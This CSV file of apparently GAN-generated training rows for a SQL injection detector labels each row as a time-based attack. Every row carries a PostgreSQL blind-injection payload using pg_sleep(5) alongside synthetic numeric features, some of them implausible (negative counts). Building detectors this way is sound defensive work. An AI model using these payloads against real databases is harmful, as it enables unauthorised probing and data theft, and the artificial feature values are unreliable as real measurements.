id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000408,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.167656006519259,75.67234802246094,21.060945510864258,9.319663047790527,33.4424934387207,-0.009067985229194164,22.572837829589844,11.378397941589355,0.9392715096473694,0.26595616340637207,0.14410726726055145,0.4379259943962097,0.13456134498119354,3.3234474658966064,0.9606826305389404,0.882134735584259,0.5562884211540222,0.26703351736068726,-0.07898811995983124,0.16537992656230927,2.5286903381347656,2.792720079421997,0.35219454765319824,0.07958456873893738,1.048667311668396,0.011912793852388859,-0.005548406392335892,0.11147342622280121,0.040903396904468536,0.21420200169086456,-0.011966023594141006,-0.059784360229969025,0.16602198779582977,0.08389049768447876,0.6020557880401611,1.0760592222213745,1.9446706771850586,0.5325896739959717,0.6803171634674072,-0.04233882576227188,0.3219224214553833,0.38258275389671326,0.5393274426460266,0.22134430706501007,0.20019720494747162,0.033187296241521835,0.03635535389184952,0.03825788199901581,-0.12977345287799835,0.008791735395789146,-0.3479219377040863,-0.0699709802865982,-0.029738903045654297,0.09951996803283691,-0.06142518296837807,-0.16645020246505737,0.06778288632631302,-0.016596641391515732,0.03686203062534332,0.16881603002548218,-0.005494467914104462,-0.00794139876961708,-0.09494280815124512,0.04996907711029053,0.29140934348106384,0.0740240216255188,-0.029245872050523758,0.238307923078537,0.06487277150154114,0.007056444883346558,0.022842682898044586,-0.18250687420368195,0.034542620182037354,0.15253019332885742,0.13161970674991608,0.04638267681002617,0.9299420714378357,0.3325853943824768,-0.0031697216909378767,0.014005577191710472,0.10124346613883972,3.4465548992156982,0.882405161857605,0.11285865306854248,0.829886794090271,0.11793079227209091,-0.01562965102493763,0.12377312034368515,-0.1692303866147995
GAN_000409,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.268028197797893,75.58954620361328,20.268627166748047,10.662056922912598,31.535900115966797,0.02121768519282341,23.287670135498047,11.431244850158691,1.267200231552124,0.24358773231506348,0.14860989153385162,0.44248729944229126,0.13306447863578796,3.2326695919036865,0.6583226323127747,0.9525663256645203,0.6885321736335754,0.3280346393585205,-0.10750102996826172,-0.153621107339859,2.44499135017395,2.7091238498687744,0.19011829793453217,0.10542909801006317,1.125811219215393,0.018989264965057373,-0.0076615773141384125,0.20491313934326172,0.058663010597229004,0.20262473821640015,0.05585998296737671,-0.0047866106033325195,0.17144142091274261,0.25097405910491943,0.571449339389801,1.2546591758728027,1.856553316116333,0.35145968198776245,0.5598370432853699,-0.1411445438861847,0.3574947118759155,0.35025766491889954,0.5467262268066406,0.16686277091503143,0.2103869616985321,0.0294748954474926,0.0027902910951524973,0.0691511407494545,-0.012098776176571846,0.0041218167170882225,-0.3783424198627472,-0.06440813094377518,-0.3626507520675659,0.3088034987449646,0.09317360073328018,0.00742359459400177,0.030315881595015526,0.1878945529460907,-0.11705450713634491,-0.01744895428419113,0.12194342166185379,0.2375599443912506,-0.12895090878009796,0.1189301535487175,0.5201233625411987,0.06342826783657074,0.222852885723114,0.026768043637275696,0.10309363901615143,-0.09527461975812912,0.1100388914346695,-0.29954129457473755,-0.0512782484292984,0.1445290893316269,0.23736964166164398,0.3074159622192383,0.8816291689872742,0.2531709671020508,-0.002815940650179982,0.006756333168596029,0.0070816949009895325,3.389439344406128,0.8454446792602539,0.2930252254009247,0.7712924480438232,0.07907389104366302,-0.13140977919101715,0.0270695798099041,-0.1972363144159317
GAN_000410,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.348537086057972,74.31188201904297,20.60953712463379,8.986157417297363,33.95576858520508,0.005075134336948395,23.74228286743164,11.911205291748047,1.0387104749679565,0.2334059476852417,0.15059217810630798,0.4318341612815857,0.13145871460437775,3.2839279174804688,0.8107365965843201,1.113329529762268,0.6169262528419495,0.29155200719833374,-0.1357467770576477,-0.07567448914051056,2.692380905151367,2.8274736404418945,0.30193275213241577,0.010833486914634705,1.017956256866455,0.018731718882918358,-0.01223583985120058,-0.07865965366363525,0.009527704678475857,0.2868236005306244,-0.07491311430931091,-0.04937759041786194,0.18263594806194305,0.1645849049091339,0.6542884111404419,1.0769519805908203,1.8820654153823853,0.19497741758823395,0.6092670559883118,-0.17746275663375854,0.4764750897884369,0.41401803493499756,0.48475199937820435,0.15793193876743317,0.23588044941425323,0.024286959320306778,0.027436651289463043,-0.1691172569990158,0.12527139484882355,0.0253182053565979,-0.7290537357330322,-0.17117875814437866,0.10634125769138336,0.21253757178783417,-0.034554269164800644,-0.2885843515396118,0.04471004754304886,-0.056108057498931885,0.26684215664863586,0.22410063445568085,0.04955141991376877,0.1968517005443573,0.028123222291469574,-0.06711740046739578,0.22516338527202606,0.19268594682216644,0.03971625864505768,0.2326035499572754,0.1584630012512207,-0.03264620155096054,-0.2964916229248047,-0.12129537761211395,0.1301252543926239,0.18450063467025757,0.1781139373779297,0.03216484189033508,1.0736373662948608,0.2951231598854065,-0.014452217146754265,-0.06097393110394478,0.14163842797279358,3.401057481765747,1.0348641872406006,0.2181321531534195,0.7884286642074585,0.032191984355449677,0.0697292685508728,0.3792276680469513,0.032522670924663544
GAN_000411,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.370575884307351,76.79811096191406,19.74150276184082,10.231650352478027,34.213985443115234,0.004113973118364811,23.588972091674805,11.209797859191895,0.9542455077171326,0.2702784538269043,0.14394274353981018,0.435007780790329,0.13885122537612915,3.3432233333587646,0.9778860211372375,0.8326213359832764,0.559476912021637,0.3156375288963318,0.033251628279685974,0.09812706708908081,2.525526523590088,2.832875967025757,0.3854282796382904,0.06086341291666031,1.1288341283798218,0.016827961429953575,-0.007012153975665569,0.13658426702022552,0.06180679425597191,0.2761474847793579,7.005035877227783e-05,-0.29133331775665283,0.2298273742198944,0.04568222910165787,0.5158860087394714,1.2129085063934326,2.0409131050109863,0.49106091260910034,0.657303512096405,-0.06659666448831558,0.3210572302341461,0.3281700015068054,0.5704794526100159,0.22909383475780487,0.2189328670501709,0.07066064327955246,0.03089417889714241,0.029360981658101082,0.045243483036756516,0.0127679742872715,-0.31171512603759766,-0.16783228516578674,0.007487528026103973,0.004739083349704742,-0.06744636595249176,-0.11710572242736816,0.07569387555122375,-0.0009744837880134583,-0.073883555829525,0.1415640264749527,0.06433995813131332,-0.02017832174897194,-0.033141836524009705,-0.03688864782452583,0.09535619616508484,0.007493019104003906,-0.18599188327789307,0.1660306453704834,0.07796119153499603,0.10652221739292145,-0.060938552021980286,0.006789559964090586,0.054806772619485855,0.09802673757076263,0.2556152045726776,0.031033331528306007,0.9227008819580078,0.35383903980255127,0.0016728689661249518,0.07288039475679398,0.060587115585803986,3.6524505615234375,0.8380852341651917,0.18076692521572113,0.9519466757774353,0.0807046890258789,-0.11613643169403076,0.25538817048072815,-0.06249266490340233
GAN_000412,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.452560381148907,74.06835174560547,21.47121810913086,8.87214469909668,33.97449493408203,0.002077518729493022,23.62723159790039,12.102485656738281,1.2422758340835571,0.2493581920862198,0.14397943019866943,0.4357317090034485,0.13249200582504272,3.2956180572509766,1.0054188966751099,1.162596344947815,0.7050764560699463,0.24368858337402344,-0.06375442445278168,0.34976205229759216,2.8411378860473633,2.6022281646728516,0.4768468737602234,0.06562209874391556,1.0357016324996948,0.0063700140453875065,-0.001105680363252759,0.10515770316123962,-0.014417645521461964,0.2657361626625061,-0.21993891894817352,-0.028483055531978607,0.1931571066379547,0.3963337540626526,0.7029823660850525,1.1347897052764893,1.568790078163147,-0.0031052017584443092,0.6891792416572571,-0.06423287838697433,0.5073820352554321,0.4234085977077484,0.516297459602356,0.16108432412147522,0.19435067474842072,0.07009036839008331,-0.014972623437643051,0.15268729627132416,0.15719303488731384,0.013054794631898403,-0.7413317561149597,-0.0855603888630867,-0.21618610620498657,-0.0501687191426754,-0.058309976011514664,-0.44294238090515137,0.059973377734422684,-0.12569642066955566,0.24080798029899597,0.14930859208106995,0.08666384965181351,0.3950124680995941,-0.08051073551177979,-0.12143880128860474,0.20701445639133453,0.13143563270568848,0.025754742324352264,0.009579487144947052,0.23305988311767578,-0.14189675450325012,-0.04049582779407501,-0.2922593355178833,0.0502706915140152,0.12949033081531525,0.2689248025417328,0.02190880849957466,0.9969497323036194,0.2318994700908661,-0.010160567238926888,-0.06023796275258064,-0.21047276258468628,3.255444049835205,0.9345099329948425,0.262826144695282,0.44225645065307617,0.05711815878748894,-0.23515643179416656,0.3533268868923187,-0.10286296904087067
GAN_000413,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,4.261636963268663,75.20413970947266,20.508787155151367,10.062192916870117,32.927085876464844,-0.015188588760793209,23.271129608154297,11.6710205078125,1.060663104057312,0.25023943185806274,0.14920863509178162,0.4365198314189911,0.13526546955108643,3.351768732070923,1.1587166786193848,0.9099413156509399,0.5953285098075867,0.29196542501449585,-0.1018623486161232,0.09903085231781006,2.522106170654297,2.8032376766204834,0.3091996908187866,-0.014825195074081421,1.0499321222305298,0.011127904057502747,-0.01081760972738266,0.09340381622314453,0.050718922168016434,0.24952828884124756,0.028741057962179184,-0.15877479314804077,0.20715731382369995,0.2383909821510315,0.5794854164123535,1.0539731979370117,1.8311102390289307,0.4018101692199707,0.6146584749221802,-0.039751939475536346,0.3466793894767761,0.3492621183395386,0.5784964561462402,0.21645605564117432,0.1800054907798767,0.05896339938044548,0.03888927027583122,0.07953381538391113,0.0042392536997795105,0.008946988731622696,-0.359708309173584,-0.02448194846510887,-0.07212252914905548,-0.03970423340797424,-0.11844398081302643,-0.041446417570114136,0.012607287615537643,0.02439213916659355,-0.0839146226644516,0.07838104665279388,-0.0563969649374485,0.16704913973808289,-0.008664913475513458,0.0898643359541893,0.20681214332580566,-0.006795588880777359,-0.031450897455215454,0.11103075742721558,0.11018391698598862,-0.030793122947216034,0.005712252110242844,-0.14666788280010223,0.15633423626422882,0.23912212252616882,0.09291452169418335,0.13340117037296295,0.9024520516395569,0.23874466121196747,-0.007008067332208157,0.025018634274601936,0.031091760843992233,3.417243242263794,0.9002537727355957,0.1547299474477768,0.7254159450531006,0.15619932115077972,0.06607858836650848,0.1929260492324829,-0.12755106389522552
GAN_000414,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.636016553650258,76.41909790039062,19.353374481201172,8.783581733703613,32.432796478271484,-0.04334619268774986,23.75454330444336,12.033588409423828,1.2218780517578125,0.255916953086853,0.17153488099575043,0.45867809653282166,0.13422821462154388,3.3112316131591797,0.5755174160003662,1.2219172716140747,0.6254172325134277,0.3801831901073456,-0.13364772498607635,0.09888406842947006,2.7885327339172363,2.476759195327759,0.2085028737783432,-0.09421820193529129,1.1042014360427856,0.022587135434150696,-0.006385792046785355,-0.12269830703735352,0.023019153624773026,0.22069256007671356,-0.0433112271130085,-0.09556160122156143,0.14985232055187225,-0.10624891519546509,0.5848035216331482,1.1387521028518677,1.9498751163482666,0.5408093929290771,0.8398846983909607,0.11587667465209961,0.3201989531517029,0.24555881321430206,0.5336326956748962,0.2507234513759613,0.1800946146249771,-0.01299898698925972,0.04453220218420029,0.20436504483222961,0.0384565033018589,0.014487583190202713,-0.5385553240776062,-0.34463930130004883,-0.201873779296875,0.1117076426744461,-0.27281707525253296,-0.21739104390144348,0.16720828413963318,0.1567775011062622,0.006540745496749878,0.32546430826187134,-0.06541544198989868,-0.10232493281364441,-0.3688831925392151,0.17702582478523254,0.573897123336792,-0.008646722882986069,0.1338600069284439,0.29848966002464294,0.023189956322312355,-0.00870765745639801,0.20374028384685516,-0.0859219878911972,0.2940337657928467,0.15420164167881012,0.5534165501594543,0.01486501470208168,0.8898748755455017,0.3743022382259369,-0.010694156400859356,0.07880401611328125,0.05269293487071991,3.295278310775757,0.9249246716499329,0.1378350406885147,0.8169297575950623,0.2508222460746765,0.2013929933309555,-0.14718040823936462,-0.2194415032863617
GAN_000415,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,4.48330059768818,74.81715393066406,20.336219787597656,9.083531379699707,33.40711975097656,-0.051171764731407166,23.44219207763672,12.0535306930542,0.9595796465873718,0.2562156617641449,0.1611006110906601,0.43599584698677063,0.1349831223487854,3.3230440616607666,1.1982862949371338,0.921178936958313,0.6028261184692383,0.35298463702201843,-0.08435608446598053,0.2832017242908478,2.6541006565093994,2.7291781902313232,0.340233713388443,-0.06797275692224503,1.0336287021636963,0.014483515173196793,-0.017063137143850327,-0.017864853143692017,0.019977279007434845,0.2333902269601822,-0.10681623220443726,-0.20066851377487183,0.21434463560581207,0.18271413445472717,0.6757931709289551,1.068278431892395,1.846672773361206,0.5577080845832825,0.7094264030456543,-0.03044148162007332,0.3400120437145233,0.26319992542266846,0.48156827688217163,0.2482684999704361,0.18524201214313507,0.0354587621986866,0.08748241513967514,0.06141936779022217,0.06669877469539642,0.018042922019958496,-0.5543281435966492,-0.15171226859092712,0.02205035462975502,-0.12922149896621704,-0.28795963525772095,-0.2169474959373474,0.09045881032943726,-0.00435294397175312,0.03749106824398041,0.33432748913764954,-0.07458898425102234,0.04050328582525253,-0.09557469189167023,0.25568336248397827,0.1920643448829651,0.05863039568066597,0.0448298379778862,0.1914823353290558,0.0754530280828476,0.06699928641319275,0.03347262367606163,-0.187453955411911,0.29425936937332153,0.2509501278400421,0.16108722984790802,-0.03853539749979973,0.9980887770652771,0.3288840651512146,-0.016269303858280182,0.021652868017554283,0.024979084730148315,3.2815744876861572,0.9691517949104309,0.1709936112165451,0.7444707751274109,0.19461309909820557,0.0977514237165451,0.11885417252779007,-0.14527693390846252
GAN_000416,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.441998722826083,77.17237091064453,20.1344051361084,9.983484268188477,33.3748893737793,-0.016178010031580925,23.189990997314453,11.478782653808594,1.0783816576004028,0.25070449709892273,0.16046865284442902,0.4426904022693634,0.13612832129001617,3.3442459106445312,0.9433621764183044,1.0273950099945068,0.6402664184570312,0.362486869096756,0.06880074739456177,0.19048641622066498,2.494501829147339,2.799013137817383,0.34691107273101807,-0.0713370218873024,1.0367931127548218,0.017447009682655334,-0.01355830393731594,-0.0181085467338562,0.09268657863140106,0.25801727175712585,0.05464925244450569,-0.19668573141098022,0.20594830811023712,0.12610380351543427,0.5558656454086304,1.0852417945861816,1.9525656700134277,0.4328060448169708,0.6434431672096252,-0.05780860036611557,0.2846372723579407,0.30202436447143555,0.5051994323730469,0.22618833184242249,0.11808707565069199,0.033509671688079834,0.052106477320194244,0.15010736882686615,0.13599909842014313,0.009922410361468792,-0.41407519578933716,-0.2134159356355667,-0.051391199231147766,0.0187581405043602,-0.2634269595146179,-0.023598134517669678,0.17809242010116577,0.21351182460784912,-0.01393849402666092,0.04489436373114586,-0.10880053788423538,-0.00686689093708992,-0.10058088600635529,0.10699664801359177,0.15048100054264069,-0.07943745702505112,-0.08992546051740646,0.17141449451446533,0.20598402619361877,0.1613471806049347,-0.018681861460208893,-0.08880513906478882,0.12749391794204712,0.222856804728508,0.3412155210971832,0.04637431725859642,0.9659563302993774,0.33064723014831543,-0.005101459100842476,0.04566188156604767,0.16936102509498596,3.3873040676116943,0.9076815843582153,0.18702811002731323,0.8223192095756531,0.12967699766159058,0.1407065987586975,0.14523181319236755,-0.15364807844161987
GAN_000417,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.537659550314218,74.52207946777344,19.216968536376953,10.953776359558105,33.466941833496094,-0.0020640103612095118,23.618398666381836,11.60627555847168,0.886715292930603,0.24759115278720856,0.15081097185611725,0.44041013717651367,0.13494384288787842,3.3383374214172363,1.0533252954483032,0.9105976819992065,0.622772753238678,0.36082082986831665,0.17760500311851501,0.11501385271549225,2.4623429775238037,3.007389545440674,0.368964821100235,-0.012872517108917236,1.0469906330108643,0.030170192942023277,-0.015710067003965378,0.0932624489068985,0.13897916674613953,0.31073203682899475,-0.02132926508784294,-0.3733900189399719,0.22640477120876312,0.21458865702152252,0.5438973903656006,1.2448372840881348,1.9532179832458496,0.47207170724868774,0.5823500156402588,-0.4016837179660797,0.42747360467910767,0.33478492498397827,0.5430582761764526,0.20313067734241486,0.1944776028394699,0.04668601602315903,0.0679345354437828,0.19462718069553375,0.380001425743103,0.01824135147035122,-0.29305824637413025,-0.24326664209365845,-0.04496541619300842,0.07146061956882477,-0.10754881799221039,0.17869871854782104,0.054116394370794296,0.24099841713905334,-0.2567780017852783,0.06854774802923203,0.16678854823112488,0.17020657658576965,-0.12482333183288574,0.08167680352926254,0.08506205677986145,-0.030212638899683952,-0.21180342137813568,0.10798852145671844,0.20354312658309937,0.13146191835403442,-0.2311968356370926,-0.25863683223724365,0.12564417719841003,0.10196112841367722,0.11478207260370255,-0.003661125898361206,1.0807621479034424,0.19994516670703888,-0.004694132134318352,0.021205341443419456,-0.09386197477579117,3.4365007877349854,0.9105849266052246,0.2342894971370697,0.7832585573196411,0.054373037070035934,0.06246228888630867,0.19324743747711182,0.008316271007061005
GAN_000418,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.316872720081002,75.56047821044922,20.58295440673828,9.555317878723145,33.730628967285156,0.0037766823079437017,23.492507934570312,11.336431503295898,0.9568066000938416,0.25588396191596985,0.14840224385261536,0.4476579427719116,0.13048218190670013,3.2996206283569336,0.6112462282180786,1.176722526550293,0.6383907198905945,0.31731632351875305,-0.0049984874203801155,-0.022861670702695847,2.7178754806518555,2.9241747856140137,0.2694971561431885,0.018955521285533905,1.0693758726119995,0.025491762906312943,-0.003588486695662141,-0.006003706716001034,0.07308206707239151,0.24118906259536743,0.017104674130678177,-0.1049404889345169,0.17128925025463104,-0.031236380338668823,0.5890001654624939,1.1639713048934937,1.9831792116165161,0.5260743498802185,0.6786980628967285,-0.13202106952667236,0.4094410538673401,0.3398592174053192,0.46592336893081665,0.25425148010253906,0.2149352878332138,-0.01697862520813942,0.029828891158103943,0.0936790183186531,0.152729794383049,0.022603260353207588,-0.29173409938812256,-0.2550510764122009,-0.037676259875297546,0.3210768699645996,-0.024874256923794746,-0.1218140721321106,0.050290413200855255,-0.04809114336967468,0.04781082272529602,0.14185971021652222,0.17052853107452393,0.09359363466501236,-0.1314101666212082,-0.044991619884967804,0.4155663847923279,0.0426015667617321,-0.0034167468547821045,0.3292044401168823,0.1202106922864914,0.07557720690965652,-0.0536838173866272,-0.08855387568473816,0.1093171164393425,0.06954837590456009,0.3596387505531311,-0.07381920516490936,0.9135125875473022,0.34982192516326904,-0.002681994577869773,-0.012576663866639137,0.11129166930913925,3.2841715812683105,0.9437803626060486,0.1423346996307373,0.8984958529472351,0.12425389140844345,0.12316298484802246,0.1142839565873146,0.043183885514736176
GAN_000419,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.501081930746279,76.67290496826172,19.933446884155273,10.525408744812012,31.999691009521484,-0.014657898806035519,23.902368545532227,11.45215892791748,0.9780727028846741,0.2638290524482727,0.16151896119117737,0.4390507936477661,0.13330553472042084,3.364729881286621,0.9722521305084229,0.8158606290817261,0.48251527547836304,0.29020750522613525,-0.007446915842592716,0.09978823363780975,2.6875815391540527,2.9006175994873047,0.2815556526184082,-0.08128675073385239,1.0523158311843872,0.015439709648489952,-0.00920600350946188,0.1632317453622818,0.07974753528833389,0.18964022397994995,0.0633692666888237,-0.24947237968444824,0.22535832226276398,0.06614794582128525,0.548401415348053,1.2379544973373413,2.0048694610595703,0.7211704850196838,0.6572966575622559,-0.11419917643070221,0.3711402118206024,0.3072710335254669,0.5279890298843384,0.2122332751750946,0.18312811851501465,0.05749247223138809,0.05971865355968475,0.18231500685214996,0.2204086184501648,0.014810901135206223,-0.14817151427268982,-0.21560436487197876,-0.1706908643245697,-0.007272828370332718,-0.08268263190984726,0.051759589463472366,0.011980094015598297,0.1964346468448639,-0.1561112105846405,0.3552052974700928,-0.0006973892450332642,0.1422821581363678,-0.043271273374557495,0.17726287245750427,0.34618592262268066,0.027552377432584763,-0.028050947934389114,0.09338384866714478,0.04153408855199814,-0.10169956833124161,0.07005920261144638,-0.1268327385187149,0.25271639227867126,-0.011758536100387573,0.11514943093061447,-0.051388081163167953,0.8507402539253235,0.3489891588687897,-0.007307958789169788,0.06088336557149887,-0.048622213304042816,3.3259336948394775,0.89341139793396,0.2927285432815552,0.9361127614974976,0.17581027746200562,0.04430534318089485,-0.10077637434005737,-0.014597006142139435
GAN_000420,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.357142534513274,75.07365417480469,20.612272262573242,10.64841079711914,32.50839614868164,0.003462859196588397,23.66567039489746,11.848301887512207,1.0580226182937622,0.22800511121749878,0.1477542519569397,0.4395606517791748,0.13311538100242615,3.274306535720825,0.8581627607345581,1.3092387914657593,0.8019700050354004,0.30226144194602966,0.03170235827565193,0.027557995170354843,2.5773229598999023,2.8961946964263916,0.35839226841926575,-0.05217050760984421,0.9836809635162354,0.01784413307905197,-0.004920261912047863,0.02971036732196808,0.07378505170345306,0.3151720464229584,-0.1155710220336914,-0.12294791638851166,0.19215808808803558,0.2758498787879944,0.6171743869781494,1.232922077178955,1.924904227256775,0.2198164016008377,0.5759783387184143,-0.3478590250015259,0.46773582696914673,0.39419013261795044,0.522934079170227,0.15369465947151184,0.23617565631866455,0.052771877497434616,0.036902204155921936,0.12865082919597626,0.19830095767974854,0.018871372565627098,-0.6260985732078552,-0.11987363547086716,-0.049076907336711884,0.2920844554901123,-0.08528554439544678,-0.09788432717323303,0.2859443128108978,0.2869110107421875,0.06215165555477142,0.1823314130306244,0.15506187081336975,0.13108497858047485,-0.2740441560745239,0.041625574231147766,0.2666197717189789,-0.055175673216581345,0.06411939859390259,0.06558838486671448,0.24506309628486633,0.05819511041045189,-0.15851683914661407,-0.1959671825170517,0.03236638009548187,0.2572711408138275,0.32927101850509644,0.0631866604089737,1.1140480041503906,0.24701569974422455,-0.006937619298696518,-0.03476784750819206,-0.004058457911014557,3.4306201934814453,0.9373222589492798,0.31464436650276184,0.7279210686683655,0.0771324634552002,0.09630787372589111,0.26739388704299927,-0.017708204686641693
GAN_000421,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,4.401175719271329,76.0685806274414,21.028282165527344,10.677088737487793,32.30827331542969,-0.018849831074476242,23.14362907409668,11.612519264221191,1.095670223236084,0.2565084397792816,0.15135471522808075,0.43446603417396545,0.13631753623485565,3.297438859939575,1.1109739542007446,0.8747909665107727,0.6930416226387024,0.3097382187843323,-0.13532832264900208,0.13628138601779938,2.6530983448028564,2.765791416168213,0.3867664933204651,-0.08363217860460281,0.9956532120704651,0.011090484447777271,-0.00987411942332983,0.12081362307071686,0.03807597979903221,0.23514103889465332,-0.05741367116570473,-0.2686018943786621,0.24626979231834412,0.1966114193201065,0.5628307461738586,1.2169647216796875,1.9027013778686523,0.4907391369342804,0.6515151858329773,-0.06259405612945557,0.36259767413139343,0.31763654947280884,0.6153743267059326,0.21964147686958313,0.21392689645290375,0.08283981680870056,0.04582829400897026,0.1667611002922058,0.043333183974027634,0.01148657314479351,-0.33267712593078613,-0.0877593383193016,-0.03898531198501587,-0.06017973646521568,-0.14094200730323792,-0.038113489747047424,0.2232704758644104,0.08293066918849945,-0.14220772683620453,0.3199949264526367,-0.045786600559949875,0.06432215124368668,-0.05747424066066742,0.20226499438285828,0.32390639185905457,0.016914930194616318,0.04229573905467987,-0.01228369027376175,0.11528333276510239,-0.06007813662290573,0.07572907209396362,-0.1432051658630371,0.11347374320030212,0.11764185130596161,0.20938481390476227,0.08964367210865021,0.8631191253662109,0.32621437311172485,-0.004583981353789568,0.05560602992773056,-0.01263563334941864,3.4087555408477783,0.8770440816879272,0.28514400124549866,0.7850121259689331,0.25397980213165283,-0.034367531538009644,0.029658645391464233,-0.02393084019422531
GAN_000422,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,4.550325403527527,76.86917877197266,20.981416702270508,9.680455207824707,33.17390823364258,-0.024515461176633835,23.583251953125,11.646708488464355,0.9592965841293335,0.2639552354812622,0.14957945048809052,0.44751641154289246,0.13423998653888702,3.3680379390716553,0.9334073662757874,1.1194391250610352,0.592077910900116,0.25575441122055054,0.10404706746339798,0.09521506726741791,2.898416757583618,2.7706079483032227,0.37576979398727417,-0.010008163750171661,0.9423676133155823,0.018524741753935814,-0.0018409315962344408,-0.1296226978302002,0.03804270178079605,0.2635677754878998,-0.09499578177928925,-0.21900734305381775,0.18977656960487366,-0.025124438107013702,0.6036173105239868,1.1100714206695557,2.0542800426483154,0.6188419461250305,0.8163865804672241,-0.093027763068676,0.451101154088974,0.3134291172027588,0.5262624025344849,0.21590927243232727,0.18915152549743652,0.023315496742725372,0.045965526252985,0.14658981561660767,0.25961726903915405,0.02730141393840313,-0.3261849284172058,-0.26777228713035583,-0.017475783824920654,0.10660488903522491,-0.1183294951915741,-0.28327804803848267,0.06044888123869896,-0.06205723062157631,0.08115869760513306,0.36439552903175354,-0.02547597885131836,0.03429330140352249,-0.20204828679561615,-0.007528670132160187,0.3153059780597687,0.0055977776646614075,-0.16487713158130646,0.380376935005188,0.1331629604101181,0.044930048286914825,-0.08212661743164062,-0.04225175082683563,0.2680054008960724,0.04794624447822571,0.46267974376678467,-0.21448709070682526,0.8743509650230408,0.3214976191520691,-0.0032564287539571524,0.008534884080290794,-0.020340628921985626,3.277596950531006,1.014001727104187,0.14044183492660522,0.8984723687171936,0.3194141685962677,0.2775941789150238,0.1351051926612854,0.13551601767539978
